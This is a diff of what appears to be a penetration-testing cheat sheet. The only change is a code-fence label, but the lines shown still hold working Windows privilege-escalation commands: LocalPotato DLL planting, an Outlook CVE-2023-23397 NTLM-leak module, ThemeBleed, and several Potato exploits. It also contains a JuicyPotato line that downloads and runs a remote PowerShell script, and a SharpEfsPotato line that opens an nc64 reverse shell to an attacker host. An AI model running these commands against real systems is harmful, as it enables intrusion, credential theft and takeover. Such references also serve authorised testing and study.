@@ -1060,14 +1060,14 @@ void DoStuff() {
 
 First get the `paths` from the `environment`, then use `LocalPotato` to place the `malicious DLL`.
 
-```console
+```cmd
 C:\> reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -v Path
 C:\> LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll
 ```
 
 At least trigger `StorSvc` via `RpcClient.exe`.
 
-```console
+```cmd
 C:\> RpcClient.exe
 ```
 
@@ -1113,7 +1113,7 @@ $ sudoedit /etc/motd
 
 ## CVE-2023-23397: Microsoft Outlook (Click-to-Run) LPE (0-day) (PowerShell Implementation)
 
-```console
+```cmd
 PS C:\> Import-Module .\CVE-2023-23397.ps1
 PS C:\> Send-CalendarNTLMLeak -recipient "<EMAIL>" -remotefilepath "\\<LHOST>\<FILE>.wav" -meetingsubject "<SUBJECT>" -meetingbody "<TEXT>"
 ```
@@ -1223,11 +1223,11 @@ extern "C" __declspec(dllexport) int VerifyThemeVersion(void);
 
 ```
 
-```console
+```cmd
 PS C:\> .\ThemeBleed.exe make_theme <LHOST> aero.theme
 ```
 
-```console
+```cmd
 PS C:\> .\ThemeBleed.exe server
 ```
 
@@ -1448,7 +1448,7 @@ else:
 
 ### Vulnerability Verification
 
-```console
+```cmd
 PS C:\> sc qc VSStandardCollectorService150
 ```
 
@@ -2068,7 +2068,7 @@ if __name__ == "__main__":
 
 > https://github.com/BeichenDream/GodPotato
 
-```console
+```cmd
 PS C:\> .\GodPotato-NET2.exe -cmd '<COMMAND>'
 PS C:\> .\GodPotato-NET35.exe -cmd '<COMMAND>'
 PS C:\> .\GodPotato-NET4.exe -cmd '<COMMAND>'
@@ -2145,7 +2145,7 @@ $RESULT | ogv
 
 ### Execution
 
-```console
+```cmd
 PS C:\> .\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\Windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" -t *
 ```
 
@@ -2153,7 +2153,7 @@ PS C:\> .\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p
 
 > https://github.com/antonioCoco/JuicyPotatoNG
 
-```console
+```cmd
 PS C:\> .\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami"
 ```
 
@@ -2183,7 +2183,7 @@ $ mysql -u root
 
 > https://github.com/itm4n/PrintSpoofer
 
-```console
+```cmd
 PS C:\> .\PrintSpoofer.exe -i -c powershell
 ```
 
@@ -2195,7 +2195,7 @@ PS C:\> .\PrintSpoofer.exe -i -c powershell
 $ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<RHOST>:<LPORT>
 ```
 
-```console
+```cmd
 PS C:\> .\RemotePotato0.exe -m 2 -r <LHOST> -x <LHOST> -p <LPORT> -s 1
 ```
 
@@ -2203,7 +2203,7 @@ PS C:\> .\RemotePotato0.exe -m 2 -r <LHOST> -x <LHOST> -p <LPORT> -s 1
 
 > https://github.com/bugch3ck/SharpEfsPotato
 
-```console
+```cmd
 PS C:\> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
 ```
 
